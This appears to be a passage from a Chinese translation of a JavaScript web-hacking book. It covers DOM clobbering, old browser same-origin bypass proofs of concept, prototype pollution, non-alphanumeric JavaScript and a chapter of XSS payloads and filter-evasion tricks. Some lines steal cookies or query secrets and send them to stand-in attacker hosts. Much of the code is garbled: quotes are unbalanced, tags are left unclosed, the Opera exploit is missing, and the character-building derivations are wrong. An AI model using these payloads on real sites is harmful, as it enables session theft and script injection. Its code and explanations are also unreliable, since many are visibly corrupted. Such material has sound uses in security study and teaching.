</style>
<script>
alert(foo)//[object Window]
alert(foo.bar)//clobbered:1337
</script>
```

使用这种技术，你可以覆盖任意数量的属性，只要足够的时间让它们渲染。但问题是，为了指定嵌套的`iframe`属性，你受到单引号和双引号使用的限制，一旦使用了某种特定的引号，解决方案就是使用 HTML 编码，你可以根据需要对"srcdoc"的内容进行多次编码。你没错，你可以在"srcdoc"内部使用 HTML 实体来渲染 HTML！

让我们尝试覆盖五个属性。我们需要一个带有第一个属性名称`name`属性的`iframe`以及双引号的"srcdoc"。然后是另一个`iframe`用于第二个属性的单引号"srcdoc"以创建另一个嵌套，从而创建第三个属性。之后，我们创建不带引号的"srcdocs"来创建我们覆盖的锚点。由于我们使用了嵌套的"srcdocs"，我们必须对所需的`iframe`数量进行 HTML 编码。我们使用`style`块提供渲染时间，在完成这一切之后，我们可以覆盖 a.b.c.d.e。

```html
<iframe name=a srcdoc="
<iframe srcdoc="<iframe srcdoc=a/id=d&amp;amp;#x20;name=e&amp;amp;#href=\clobbered:1337&amp;amp;&gt; &a&amp;#x20;id=d&amp;amp;gt;name=d&gt; name=b</iframe</iframe>
>
<style>@import '//garetheyes.co.uk'</style>
<script>
alert(a.b.c.d.e)//clobbered:1337
</script>
```

## 过滤器利用

还有其他利用 DOM 覆盖（clobbering）的方法。控制值只是利用的一种方法。你可以覆盖 DOM 节点的属性来欺骗过滤器完全不移除任何属性。考虑下面的示例，它显示了一个具有三个属性的`form`元素，脚本循环遍历属性到第一个并检查它们是否以"on"开头，如果是则移除属性：

```html
<form id=x onclick=alert(i) onmouseover=alert(2)>
<input>
</form>
<script>
for(let i=document.getElementById('x').attributes.length-1;i>=0;i--) {
  let attribute = document.getElementById('x').attributes[i];
  if(/\on/i.test(attribute.name)) {
    continue;
  }
}
</script>
```

# 第五章 - 浏览器漏洞

## 引言

没有关于浏览器漏洞的章节，就不可能一本 JavaScript 黑客书籍，对吧？在本章中，我将讨论多年来发现的各种浏览器漏洞。我破解浏览器（大多是在业余时间）已经超过15年。在此期间，我成功在每个主流浏览器引擎中发现了 SOP（同源策略）的绕过或渗透漏洞。

本节不会按照我发现漏洞的时间顺序排列；相反，我将从简单的漏洞开始，引向更复杂的 SOP 绕过。

## Firefox 对跨源 URL 处理不当

这个漏洞非常简单，我很惊讶 Mozilla 的自动化测试没有捕获它。我是在测试跨源窗口时发现这一个。当时我正在创建新窗口，并通过查看浏览器控制台或 Hackvertor 检查器来检查跨源对象。其思路是在调用`window.open`后获取新窗口的引用并检查该对象，看看是否有任何不该泄露的数据泄露。

当你调用`window.open`时，它的返回值是新窗口对象，这与你以前使用的窗口对象不同。许多属性是不可用的，且当你尝试读取它们时会抛出异常。其原因显而易见：如果你打开了一个指向不同源的窗口，而窗口对象允许你读取所有属性，你就可以从任何网站窃取数据，这会导致你现在的每一个账户都被破解。

该漏洞的利用简单得令人脸：你打开一个新窗口，等待五秒，然后尝试读取`location`对象。通常在 Firefox 上会抛出异常，但他们允许你读取它。当我第一次发现这个漏洞时，我以为是 RegExp 的某个方法出了问题，但结果证明你只需要读取`location`对象的`toString()`方法：

```html
<script>
  function poc() {
    var win = window.open('https://twitter.com/lists/', 'newWin', 'width=200,height=200');
    setTimeout(function(){
      alert('Hello '+https://twitter.com/[//]++').exec(win.location[1]);
    }, 5000);
  }
</script>
<input type=button value="Firefox knows" onclick="poc()">
```

上面的概念证明（PoC）打开了一个指向`twitter.com/lists`的新窗口，导致重定向到一个个性化的 URL。第二个部分等待五秒，然后尝试读取`location`对象，并使用正则表达式获取 twitter 用户名。它会显示一个警告框并识别你的身份。

## Safari 对源主机名（hostname）的赋值

以前破解浏览器要容易得多。这个 Safari 漏洞就证明了这一点。它涉及设置跨源 location 对象的 hostname。问题在于 Safari 对查询字符串和哈希（hash）的安全处理非常糟糕，因为它们可能包含敏感信息。如果在今天被发现，最大的目标可能是 OAuth 令牌。要利用此漏洞，你需要使用新窗口或 iframe，等待它加载，然后设置 hostname，之后攻击者的域名就可以读取查询参数或哈希值。

```html
<script>
  function poc(iframe) {
    var win = iframe.contentWindow;
    setTimeout(function(){
      win.location.hostname='attacker.tld'
    }, 5000);
  }
</script>
<iframe src="https://oauth.example.com" onload="poc(this)</iframe>
```

上面的示例加载了一个 iframe，该 iframe 将执行某种身份验证并将敏感数据存储在查询字符串中。当页面在目标网站重定向后加载时，`poc()`函数被调用，它获取 iframe 的引用以及指向 iframe 跨源内容的 contentWindow。五秒后，攻击者更改 iframe 的 hostname 指向攻击者的域名。然后，攻击者只需在自己的域名上读取`location.search`即可窃秘密。

```html
<script>
var contents = location.search//contains the query string secrets
</script>
```

在现代浏览器中你无法再这样做；它们明智地阻止了对 host 和 hostname 属性的读写访问。

## Internet Explorer 完整的 SOP 绕过

我在为微软承包测试各种 IE 功能时发现这个漏洞的。我喜欢这个漏洞，因为它如此简单却影响巨大。使用这个漏洞你可以在任何域上执行任意 JavaScript。这再次涉及到窗口和 iframe，令人震惊吧。你感觉到其中的某种规律了吗？当 IE 泄露源时发生了什么？

以下是利用方法：

- 访问带有 iframe 的页面
- 观察到你可以设置 iframe 的 name
- 尝试导航到不同的源
- 使用 iframe 访问`document.domain`

```html
<script>
window.location.href = "attacker.com";
</script>
```

上面的代码允许你在任何域上执行任意 JavaScript。

```html
index.html:
<script>
onload = function(){
  x.contentWindow[0].location = 'about:blank';
  setTimeout(()=>alert(x.contentWindow[0].document.baseURI),500)
}
</script>

<iframe id="x" src="subdomain1.portswigger-labs.net/chrome-infoleak-sWpsDkg9102/tar/index.html</iframe>
```

这是被嵌入的页面，请注意它已被修改，并且可以被来自不同源的框架读取：

```html
target.html:
<script>location.hash=1337</script>
<iframe src="foo</iframe>
```

## Safari 完整 SOP 绕过

针对这个问题，我曾向 Apple 报告了一个漏洞，但他们将其驳回为一个无法利用的微要问题。我一直等到 Safari 的下一个版本发布，熬夜了 23 小时来尝试利用它。我不建议你这样做，因为这不健康，但在当时我想证明 Apple 是错的，我所做的一切让我感到非常满足。

这个漏洞再次使用了带有空白 URL 的 iframe（你注意到这里的模式了吗？）。当 iframe 加载时，我获取了该框架的 document 对象的引用，并用它在文档中写入了另一个 iframe。新添加的 iframe 指向不同的域名，我选择了 Amazon 来演示这个问题。值得注意的是，在点击劫持（Clickjacking）发明之前，你实际上可以嵌入任何网站。当最内层的 iframe 加载后，从外部框架可以获取对内层框架的引用。我可以获取 Amazon 的 cookie 和 HTML，完全绕过了 SOP。以下是漏洞利用代码：

```javascript
<script>
function breakSandbox() {
  var doc = window.frames.loader.document;
  var html = '';
  html += '<p>test</p><iframe src="http://www.amazon.co.uk/" id="iframe" name="iframe" onload="alert(window.frames.iframe.document.getElementsByTagName('body')[0].innerHTML);alert(window.frames.iframe.document.cookie);</iframe>';
  doc.body.innerHTML = html;
}
</script>
```

```html
<script>
</script>

<iframe src="about:blank" name="loader" id="loader" onload="breakSandbox()</iframe>
```

多年后回来看这段代码，它可以被简化很多，并且可以使用`contentWindow`来获取跨源窗口。然而，这是一个完整的 SOP 绕过，你甚至可以利用这种技术读取文件系统，这是一个非常有破坏性的漏洞，我对此感到非常自豪。

## Opera SOP 绕过

这是我发现过的喜欢的浏览器。我喜欢这个漏洞，因为它展示了你如何以意想不到的方式绕过 SOP。还记得我在在本章稍早使用`document.domain`来判断你是否有一个跨源窗口吗？嗯，当我发现这个漏洞时，它不起作用，我收到了一个阻止访问对象的浏览器异常。但并未止于此。我发现了一种无论如何在另一个域名上执行任意 JavaScript 的方法。

我开始测试 Opera。这是在 blink 分叉之前的 Presto 版本。我使用了我的枚举器`Astalanumerator`，这是在 Hackability 异常发布之前的，如果你想控制你的测试，我建议使用 Hackability 检查器。通过该枚举器，我创建了一个指向外部位置的 iframe，然后枚举了所有属性，`contentWindow`没有异常，于是我转向了跨源对象。这立即引起了我的注意，Opera 似乎暴露了比其他浏览器多多的属性。这是一个存在漏洞的良好指标。

我使用了我常用的技巧`constructor.constructor('alert(document.domain)')()`，但令我惊讶的是它由于 JavaScript 异常失败了。这很不寻常，通常当你有一个构造函数时，它仍然会执行，但在当前源上下文，抛出异常给了我一个良好的指标，表明 Opera 允许跨源构造函数。

思考异常了一段时间后，我想如果我使用带有某些字面量的表达式会发生什么。如果这没有抛出异常，说明之前的代码被拦截是因为调用了 alert 或访问了文档。确实，当使用`constructor.constructor('return 1+')`时，我得到了 2！我这刻变得兴奋了，因为我已经有了一个漏洞：如何在另一个域名中执行任意代码？我再次证明了这一点，如果字面量被允许，也许它们阻止了对全局对象的访问？我重写了`Array`原型上的一个方法。重要的是，我只是定义了一个函数，并没有尝试调用它。我使用浏览器控制台调用另一个域名上的`[]join`，然后事情发生了，我得到了一个包含外部域名内容的漂亮 alert。

```javascript
<script>
```

```html
<iframe src="about:blank"

loader"
```

# 第六章 - 原型污染 (Prototype pollution)

## Gadget (get)

Gadget 意味着你所污染的属性被用于某些有趣的地方，例如`eval`函数或其他方法或赋值，这可能导致漏洞。当该属性到达一个漏洞汇点（sink）时，它就成为了 gadget。

## 潜在的 gadget (Potential gadget)

如果你发现了一个可以通过原型污染控制的属性，但你尚未确定它是否触及了汇点，那么你可以将其称为一个潜在的原型污染 gadget。

## 客户端原型污染

原型污染有两种形式：客户端和服务器端。本节将讨论客户端的形式。利用客户端原型污染的目标通常是 DOM XSS。你寻找网站是否允许向`Object`原型添加属性，然后查看该属性是否触及了导致能够控制 JavaScript 或 HTML 的汇点。

## 寻找原型污染

现在我们已经定义了术语，可以开始寻找原型污染了。你可以简单地注入一个攻击向量，然后使用浏览器控制台来确认。例如，假设一个网站允许你在查询字符串中使用名称和值，并且它们使用的库中有一个存在漏洞的合并操作。你可以在查询字符串中注入一个探测载荷，尝试在`Object`原型上设置属性：

```
__proto__[foo]=bar
```

页面加载后，你可以使用浏览器控制台检查`Object`原型：

1. `console.log(Object.prototype)`
2. //`foo: 'bar', constructor: f, __defineGetter__: f, __defineSetter__: f, hasOwnProperty`
3. `r, f -`

如果`Object`原型包含你找到的属性，说明你成功发现了客户端原型污染。使用`__proto__`属性并不是寻找原型污染的唯一方法，你可以使用`constructor[prototype]`属性，这本质上是一样的，它比`__proto__`属性不常见，因为因为它需要三个属性键，而网站通常只使用两个。要测试这一点，你可以遵循相同的流程，只需将`__proto__`替换为`constructor[prototype]`：

```
?constructor[prototype][foo]=bar
```

如果网站对该技术敏感，这会导致对对象原型的操纵：

```javascript
console.log(Object.prototype) 
//{foo: 'bar', constructor: f, __defineGetter__: f, __defineSetter__: f, hasOwnProperty
__defineGetter__: f, __defineSetter__: f, hasOwnProperty
```

不同的库解析查询字符串的方式不同，我遇到过在查询字符串中使用点的网站，测试这种情况只需移除方括号并添加点来访问不同的属性键：

```
?__proto__.foo=bar
```

检查 hash（哈希值）也是值得的，我见过一些将 hash 解析为查询参数的网站。如果你尝试查询字符串和 hash 的任何组合，那应该可以覆盖 99% 的客户端原型漏洞。

## 修改原生方法

当网站易受原型污染攻击时，你不局限于操纵`Object`原型，你还可以更改全局`Object`或其他内置原生方法之一。例如，假设一个网站使用了`Object.keys`方法，可能可以使用原型污染源来覆盖此方法。这种攻击可能如下所示：

```
__proto__[keys]=//Object.keys === ""
```

这通过将方法赋值为字符串来移除该方法的功能。在实践中，这种攻击很难利用，因为你无法直接提供你的函数，而是受限于字符串或 JSON 支持的类型。然而，你可以将这种技术作为漏洞链的一部分，引导你进入不同的代码路径。

## 原生浏览器 API

非常令人惊讶，浏览器 API 本身也容易受到原型污染。只要 API 允许你将对象字面量作为参数传递（通常在配置中），你就可以使用原型污染来影响值。一个例子是`fetch()`函数，它的第一个参数接受字符串或请求对象，第二个参数接受一个对象。如果网站没有包含请求对象或对象中的某个属性，那么你可以使用原型污染来影响它们。如下例所示，最为清晰：

```javascript
Object.prototype.body='foo=bar'
const request = new Request('/myEndpoint', {
  method: 'POST',
});
fetch(request);
```

上面的代码使用`Request`对象构建发送到`fetch()`函数的请求，因为`Request`对象没有定义`body`属性；可以通过原型污染通过继承的属性来控制该属性。当发送 POST 请求时，它将包含一个 POST 请求。



既然你发现了一个潜在的 gadget 并存在原型污染，如何识别真正的 gadget 呢？首先你需要在页面执行代码之前执行一些 JavaScript。你可以通过使用像 Burp 这样的代理并在任何代码执行之前添加 `debugger` 语句来实现。`debugger` 是一个特殊的 JavaScript 命令，它会调用 JavaScript 调试器（通常是 DevTools），当执行到 `debugger` 语句时，JavaScript 的执行将在遇到语句的地方暂停，你可以自由使用调试器输入你自己的 JavaScript。如果你发现某个原型是一个真正的 gadget，可以使用 `Object.defineProperty()` 来发现哪个属性被使用了。你可以调用此方法，并在每次访问属性的 getter 时都进行一次堆栈跟踪（stack trace）：

```javascript
Object.defineProperty(Object.prototype, 'potentialGadget', {
  __proto__: null,
  get() {
    console.trace();
    return 'test';
  }
});
```

通过堆栈跟踪，你可以识别出源代码中使用该属性的部分，以及该值最终是否进入了漏洞点（sink）。目前有一些工具可以自动化此过程。我写了一个名为 DOM Invader 的工具，它可以检测原型污染的源和 gadget。它是 Burp Suite 内置浏览器的一个扩展程序。

## 服务端原型污染

客户端原型污染非常容易检测，因为你拥有源代码；而服务端原型污染要困难得多，因为污染发生在服务器上，你通常无法访问源代码。当涉及到 DoS（拒绝服务攻击）时，问题会进一步升级：在客户端，你可以刷新浏览器让一切恢复正常；但如果由于 DoS 发生在服务器端，应用程序可能会崩溃并导致你或其他用户无法访问，唯一的解决方案是重启 node 进程。

如果你有源代码，情况会更加简单。同样的原理也适用于服务端原型污染：你拥有技术（technique）、源（source）和 gadget（gadget）。只要你控制 node 进程并自己托管应用程序，你甚至可以像使用浏览器控制台成功检测原型污染那样的方法进行检测。node 有两个至关重要的命令行标记：

- `--inspect`
- `--inspect-brk`

第一个选项允许你使用 devtools 调试 node 应用程序，你只需在运行程序时添加该命令行标记即可：

```bash
node --inspect your-app.js
```

然后你可以通过访问 `chrome://inspect/` 来使用 Chrome 调试 node。

如果你正确启动了进程，应该能看到一个远程目标（remote target）。你可以检查该目标并访问控制台。与客户端一样，你可以使用控制台检查 `Object.prototype`。堆栈跟踪依然有效，你可以使用章节前面提到的 `Object.defineProperty()` 技术获取访问属性的准确行号。

在某些情况下，你想调试已经运行的应用程序的一部分，因此调试器已经跳过了你想调试的部分。这就是第二个命令行标记的用武之地——`--inspect-brk`，它会指示 node 进程在应用程序执行之前暂停，这在 node 应用程序中寻找 gadget 时非常有用。然后你可以再次使用 Chrome 访问之前提到的 URL，可以使用调试器单步执行或恢复执行，甚至添加你自己的断点。

使用 devtools 的全局搜索（sitewide search）对于测试也非常方便。一旦你按照前面的说明打开了远程控制台，就可以对所有正在运行的 node 应用进行搜索。点击 devtools 窗口右侧的三个点并点击 search 选项。可以用它来寻找潜在的 gadget。结合前面提到的 `defineProperty()` 技术，应该有助于识别出它们。

## 总结

在本章中，我们介绍了原型污染，定义了什么是技术、源和 gadget。我们向你展示了如何寻找原型污染，以及如何利用原型污染漏洞修改原生函数。我们还讨论了即使是 JavaScript 原生 API，当在参数中使用对象时也会受到原型污染的影响。我们展示了如何手动寻找潜在的 gadget，并最后介绍了服务端原型污染，以及如何使用与客户端相同的技术调试 node 应用程序。

# 第七章 - 非字母数字 JavaScript

## 编写非字母数字 JavaScript

这一切始于 "slackers" 的用户注意到来自长泽佑介（Yosuke Hasegawa）的一篇令他们惊讶的新帖，他是一位出色的日本安全研究人员。在博文中，他详细介绍了如何在不使用字母数字字符的情况下执行 JavaScript。这对我们所有人来说都是一次启示，我们开始剖析它的工作原理。基本思想是使用方括号和 JavaScript 表达式来创建字符串，并使用基于表达式的数字索引来拼接字符串，从而创建有效的属性名，最终在不使用任何字母数字字符的情况下编写任意 JavaScript。这也因此变成了 JSF'ck（我遮盖了 "u"，所以这本书不会显示脏话）。从现在起，我将通过它的姓称称其“非字母数字”JavaScript 或 non-alpha JS。你只需要一种生成数字的方法，因为 JavaScript 是弱类型语言，你可以使用中缀运算符 `"+"` 来实现，该运算符会尝试将后面的表达式转换为数字，如果无法转换，则转换为 NaN（非数字）。第一步是获取一个零：

```javascript
+[]
```

太棒了，我们得到了 0，但这只允许我们获取字符串的第一个字符：

```javascript
'abc'[+[]] // a
```

但我们如何获取 "b" 呢？嗯，你可以将方括号访问器与数组结合，并在数组中获取它的引用，JavaScript 允许你像处理标识符一样增加/减小这个值：

```javascript
[] // 创建一个包含 0 的数组
[][[]][+[]] // 获取数组中的第一个元素
++[][+[]] // 增加数组中的第一个元素
```

希望你一直跟上了，可能值得尝试每段代码片段以理解发生了什么。一旦你掌握了这个概念，就可以开始生成字符串和数字了。你只需要嵌套数组并不断增加它们的值。我会使用空格来帮助区分每个部分。如上面的代码所示，你创建一个包含 `[]`（即零）的数组，然后使用 `[+[]]` 访问数组中的第一个元素，通过增加运算符增加数字。

我们现在可以在文本中使用 "c" 了：

```javascript
'abc'[[+[]]]
```

```javascript
++[+[]][+[]] // 1
```

然后从另一个示例中获取假值字符串：

```javascript
[![]+[]][+[]] // false (string)
```

然后将它们与假值字符串以及一个包含数字的访问器结合在一起：

```javascript
[![]+[]][+[]][++[+[]][+[]]] // a
```

为了方便阅读，我在上面添加了空格。在收集时，最好将它们保存到带有注释的文本文件中，说明它们代表什么，这使得从它们构造字符串变得更容易。希望到目前为止你对创建这些字符已经很有把握了。让我们继续创建 `false` 的剩余字符。

```javascript
[![]+[]][+[]][++[+[]][+[]]][+[]] // l
```

你可以看到我确实修改了上一个代码片段的访问器部分，以再次增加数字。我将其封装在一个数组中，获取数组的第一个元素并再次增加数字。你可以对剩余的字符执行相同的操作：

```javascript
[![]+[]][+[]][++[+[]][+[]]][+[]][+[]] // s
[![]+[]][+[]][++[+[]][+[]]][+[]][+[]][+[]] // e
```

如你所见，比较 "s" 和 "e" 字符时，生成它们只需要微小的修改。事实上，我们可以复用这个过程来生成 `true` 的反面，即 `false`。毕竟这是一本 JavaScript 攻击书籍，我们必须寻找捷径。还记得我们发现 `![]` 生成 `false` 吗？如果我们再次使用逻辑非运算符，它将转换为 `true`：

```javascript
!![] // true
```

我们将之前生成的每个代码示例中的单感叹号替换为双感叹号，用以生成：

```javascript
[!![]+[]][+[]][+[]] // f
```

变为：

```javascript
[!![]+[]][+[]][++[+[]][+[]]] // t
```

依此类推：

```javascript
[!![]+[]][+[]][++[+[]][+[]]][+[]] // u
```

我们已经有一个 "e" 了，现在来生成它。你现在可以看到如何非常容易地生成字符了。你可能在想如何生成任意的 JavaScript。首先，你需要获取一个函数，为了做到这一点你需要一些字符，当它们作为访问器使用时可以获取函数，然后你可以使用函数获取构造函数，这将是 `Function` 构造函数，你能看出这是指向哪里吗？一旦你获得了对 `Function` 构造函数的访问，就可以调用它生成任意的 JavaScript，但让我们以后考虑。第一步是获取一个函数，幸运的是，有一个短函数可以通过我们生成的字符来访问。该函数允许你获取字符串的单个字符或数组的元素，取决于你在哪个上使用它。我们将使用它，因为它显然很短。所以我们首先需要空数组：

```javascript
[]
```

然后添加一个访问器：

```javascript
[][ ]
```

然后添加字符串 "a" 并将其与 "t" 拼接：

```javascript
[][ [![]+[]][+[]][++[+[]][+[]]] + [!![]+[]][+[]][++[+[]][+[]]] ] // at function
```

一旦我们获得掌握了生成更多字符的能力。这是因为函数可以转换为字符串：

```javascript
[].at + '' // function at() { [native code] }
```

如果我们看之前生成的字符，剩余需要生成的字符只有 "o"、"t" 和 "n"。我们可以使用 `undefined` 来生成 "n"，这是我们接下来要做的。首先创建一个空数组并尝试访问第一个元素，该元素是 `undefined`：

```javascript
[][+[]] // undefined
```

然后将其转换为字符串，第二个字符位于位置一：

```javascript
[[][+[]]+[]][+[]][++[+[]][+[]]] // n
```

现在我们可以生成其他字符来创建 `constructor` 属性。为了生成缺失的字符，我们可以复用 `at`，将其转换为字符串，生成所需的位置，并最后提取它们。

首先创建一个空数组并访问第一个元素：

```javascript
[][+[]]
```

然后将函数放入数组中并与空数组拼接以创建一个字符串：

```javascript
[ [].at + '' ][+[]]
```

我们可以使用该字符串生成 "c"：

```javascript
[ [].at + '' ][+[]][++[+[]][+[]]] // c
```

我们需要遵循相同的过程，但访问字符串的第 6 个位置来生成 "o"：

```javascript
[ [].at + '' ][+[]][++[+[]][+[]]][+[]][+[]][+[]] // o
```

就像拼图一样，我们可以将它们全部组合在一起以获得属性的访问：

```javascript
[ [].at + '' ][+[]][++[+[]][+[]]] + [ [].at + '' ][+[]][++[+[]][+[]]][+[]][+[]][+[]] + ... // constructor
```

## 非字母数字 JavaScript（不转换为字符串）

```javascript
[][ [![]+[]][+[]][++[+[]][+[]]] ][+[]] // at() function
```

我们通过组合 `at()` 函数、添加 `[]` 以及在访问器内部放置 "JavaScript" 字符串，获得了对 `Function` 构造函数的访问。现在我们可以通过向 `Function` 构造函数传递字符串并调用两次来执行任意的 JavaScript。

现在我们只需要生成一个发送给 `Function` 构造函数的字符串。按照 XSS 负载的传统，我们将 alert(1)。我们已经有了字母和数字：

```javascript
[![]+[]][+[]][++[+[]][+[]]] // a
[+[]][+[]] // 1
[![]+[]][+[]][++[+[]][+[]]][+[]][+[]][+[]] // e
[!![]+[]][+[]][++[+[]][+[]]] // r
[!![]+[]][+[]][++[+[]][+[]]][+[]] // t
[+[]][+[]] // 1
```

我们只需要生成一个左括号和一个右括号。为了这一点，我们可以复用生成 `at()` 函数并将其转换为字符串且访问字符串第 6 个位置的代码：

```javascript
[ [].at + '' ][+[]][++[+[]][+[]]][+[]][+[]][+[]][+[]][+[]] // (
```

我们需要将这个 6 增加到第 11 个位置：

```javascript
[ [].at + '' ][+[]][++[+[]][+[]]][+[]][+[]][+[]][+[]][+[]][+[]][+[]][+[]][+[]] // )
```

并且在此基础上增加：

```javascript
[ [].at + '' ][+[]][++[+[]][+[]]][+[]][+[]][+[]][+[]][+[]][+[]][+[]][+[]][+[]][+[]] // *
```

我们需要将这些片段按照正确的顺序排列，并将它们传递给之前生成的 Function 构造函数，使它们能够运行。不要忘记为每个字符串添加拼接符“+”。

```javascript
Function(
  'a' + 'l' + 'e' + 'r' + 't' + '(' + '1' + ')' 
)()
```

# 第七章 - 非字母数字 JavaScript

```javascript
+[] // 0
+!![] // 1
+!![]+!![] // 2
```

最后，我们需要使用中缀运算符 `+` 将数组/字符串转换为数字，最后将其封装在数组中并作为字符串：

```javascript
+[+[]] // 0
+[+!![]] // 1
```

你可以看到这离“破墙”已经有多近了，尽管缺乏布尔值对于访问构造函数是至关重要的。我们只能希望浏览器引入新的功能或方法，允许我们访问所需的字符。目前，字符墙似乎是六个字符。

## 总结

在本章中，我们涵盖了如何使用非字母数字 JavaScript 生成数字、如何使用这些数字获取字符串、如何通过访问属性并将输出转换为字符串来组合这些字符串获取更多字符。然后，我展示了如何将这些组合起来以实现任意 JavaScript 代码执行。之后，我演示了如何在不使用括号的情况下生成非字母代码。最后，我向你介绍了伟大的字符墙，并展示了仅使用 `+` 生成 `Infinity` 的方法。

# 第八章 - XSS

这一章完全关于跨站脚本攻击（Cross Site Scripting），亲切地称为 XSS，尽管这个名字听起来并不合理。既然你存储了同源（same-site）的 XSS，而你可以拥有跨源但非同源的脚本，名字就重叠了，而且无论好坏大家现在都知道它指的是什么了。在本章中，我将介绍一些你可能不知道的 XSS 技巧，并结合其他章节中学到的技术来产生一些有趣的负载。让我们开始吧……

## 结束脚本

第一种技术是在 JavaScript 字符串中使用结束脚本块。这在 XSS 社区中是广为人知的，但如果你是一个开发者，之前可能还没有遇到过。基本思想是你在 JavaScript 字符串内部有一些反射，而注入的引号经过了转义，但仍有小于和大于符号。为了利用这种场景，你可以在 JS 字符串中注入一个结束脚本的标签，这会关闭脚本块并由于字符串未闭合而抛出 JavaScript 异常，你可以继续注入自己的 HTML 并在目标应用上获取 XSS：

```html
<script></script><img/src/onerror=alert(1337)">";</script>
```

要修补此漏洞，你可以使用反斜杠转义正斜杠字符，以防止结束脚本生效，但这不是最好的修复方法，我们稍后会发现。更好的修复方法是对小于和大于符号进行 Unicode 转义，这确保了 HTML 不会在字符串内部被渲染。当然，你还必须对反斜杠和引号进行转义。

## 脚本内部的注释

你可能认为通过转义正斜杠修复之前的漏洞就解决了问题，但事实并非如此。如果你有两个注入点，一个在 JavaScript 变量内部，另一个在 HTML 属性内部。你可以注入一个开启 HTML 注释标签和脚本，这会阻止脚本关闭，脚本块将持续到遇到另一个结束脚本标签。以下代码演示了这一点：

```html
<script>
let foo = "<!--<script>
</script>
<img title="</script>><img src/onerror="alert(1)">
```

实际渲染的是：

```html
<script>
let foo = "<!--<script>
</script>
<img title="</script>><img src="" onerror="alert(1)">
```

如你输出所示，HTML 注释和开启脚本的组合抵消了现有的结束脚本，第二个结束脚本随后用于关闭脚本块，从而跳出 title 属性导致图像元素被渲染。

### SVG 脚本内部的 HTML 实体

你可能认为如果正确转义，就可以防止脚本块内的 XSS。然而，在 SVG 内部情况完全不同。HTML 实体会被渲染，因为 SVG 是 XML 格式，这意味着当实体被 SVG 解码时，JavaScript 将获得正确的未编码字符。

```xml
<svg>
<script>let foo = "&quot;-alert(1)//";</script>
</svg>
```

### 无需结束脚本的脚本

你可能想过在使用脚本块时需要一个结束脚本。至少在 Firefox 中你是错的。如果你使用 SVG，在 Firefox 上你可以有一个自闭的脚本：

```xml
<svg><script href=data:,alert(1) />
```

你必须使用 `href` 属性，因为你处于 SVG 而非 HTML 中，且那里不支持 `src` 属性。

## Window name 负载

XSS 库中的另一个常见技巧是使用 `window.name` 将负载运到其他域名或页面。浏览器正在通过移除顶层跨导航的 name 来限制这一点，但这种技术在使用 `iframe` 时仍然有效：

```html
<iframe src=//target name=alert(1)></iframe>
<!--target-->
<script>eval(name)</script>
```

你甚至可以偷带 cookie，并在导航到由你控制的页面时检索它们。例如：

```html
<script>name=document.cookie</script>
<a href="//attacker">test</a>
<!--攻击者控制的页面-->
<script>fetch('/collect-cookie')</script>
```

## 使用 Source maps 创建 ping

Source maps 是一种创建 DNS/HTTP 交互的酷炫方式。你可以使用 OOB（带外）工具，如 Burp Collaborator 或 Interactsh。这是因为开发者工具不会在网络标签中显示此类请求。工作原理如下：

```javascript
//# sourceMappingURL=https://attacker.com/
```

## 跳转 Sink

Chrome 引入了一种导致客户端重定向的新方法：`navigate()`。使用这种方法可以指定 JavaScript URL。只需调用 `navigate()` 方法即可：

```javascript
navigation.navigate('javascript:alert(1337)')
```

## JavaScript 注释

JavaScript 支持一系列注释语法。有几种不同的单行注释：

```javascript
!
//
<-
-->
```

第一个示例只有作为第一个 JavaScript 语句时才有效，如果它出现在其他地方将引发语法错误。第二个示例是创建字符串注释的标准方法，可以出现在任何地方（只要不是星号）。接下来，第三个示例的行为与之前的注释类似，它是在脚本不支持的早期添加的，但今天仍然被支持。

最后，JavaScript 允许使用结束 HTML 注释，如果在开头使用，它的作用类似于单行注释，但由于它可以被用作递减操作，大于操作在表达式内部是不支持的。每个单行注释都会一直持续到遇到换行符；这意味着回车符、换行符、段落分隔符或分隔符。

据我所知，JavaScript 只支持一种使用正斜杠和星号的多行注释：

```javascript
/*
我是一个多行注释
*/
```

## 换行符

JavaScript 支持多个字符来分隔语句。这包括回车符、换行符和段落分隔符。可以通过以下方式演示：

```javascript
eval('//\ralert(1337)'); // 回车符
eval('//\nalert(1337)'); // 换行符
eval('//\u2028alert(1337)'); // 行分隔
eval('//\u2029alert(1337)'); // 段落符
```

如果你在单行注释内部进行注入且 WAF 阻塞了换行符，那么尝试上述的替代字符是值得的。

## 空格字符

JavaScript 中有很多空白字符，使用它们可以帮助绕过那些使用正则表达式查找某些关键词的简单 WAF。这里是一种测试空白的简单方法（注意：这将包括换行符、回车符和行/段落分隔符）：

```javascript
log = [];

function funct() {
  for (let i = 0; i <= 0x10ffff; i++) {
    try {
      eval(`func${String.fromCodePoint(i)}`);
      log.push(i);
    } catch (e) {}
  }
}

console.log(log);
// 9,10,11,12,13,32,160,5760,8192,8193,8194,8195,8196,8197,8198,8199,8200,8201,8202,8232,8233,8239,8287,12288,65279
```

可以使用原始字符，如果它们出现在 SVG 或 HTML 属性中，则可以进行 HTML 编码：

```html
<img/src/onerror=alert&#65279;(1)>
```

## 动态导入

JavaScript 允许你使用 `import()` 动态加载模块，它就像一个普通函数，但允许 JavaScript 引擎决定是否实际需要。这个函数表达式允许你指定要加载的 URL，并非常方便地指定数据 URL 来执行任意 JavaScript：

```javascript
import('data:text/javascript,alert(1)')
```

## XML 中的 XHTML 命名空间

如果你可以控制内容类型为 `text/xml` 的 XML 文件，只要提供 XHTML 命名空间，仍然可以执行 JavaScript。

```xml
<xml>
<text>hello<img src="i" onerror="alert(i)" /></text>
</xml>
```

如果没有命名空间，浏览器将上述代码作为 XML 渲染并显示 XML 视图。然而，为 img 元素添加命名空间将允许其被渲染为 HTML：

```xml
<xml>
<text>hello<img src="i" onerror="alert(i)" xmlns="http://www.w3.org/1999/xhtml" /></text>
</xml>
```

这对于文件上传或当你控制具有 XML 内容类型的 REST API 响应时非常有用。

## SVG 上传

在 Web 应用中允许上传图片是很常见的，但很多人忘记了可以在 SVG 文档中使用脚本。与 HTML 内部不同，使用正确 MIME 类型的 SVG 时，解析更加严格。你需要确保添加了正确的命名空间属性，并且它符合 XML 解析规则，例如，所有属性都应该加引号。

```svg
<svg id='x' xmlns="http://www.w3.org/2000/svg" xmlns:link="http://www.w3.org/1999/xlink" width='100' height='100'>
<image href="#" onerror="alert(1)" />
</svg>
```

你可以通过明显过滤 SVG 来防止此类漏洞的利用，但如果你无法这样做，可以始终通过 `Content-Disposition` 头部和附加值来提供文件：

```
Content-Disposition: attachment
```

这应该防止 SVG 在现代浏览器中渲染。但有一个例外：如果它是通过 `<use>` 元素嵌入的，它仍然会被渲染。

## SVG use 元素

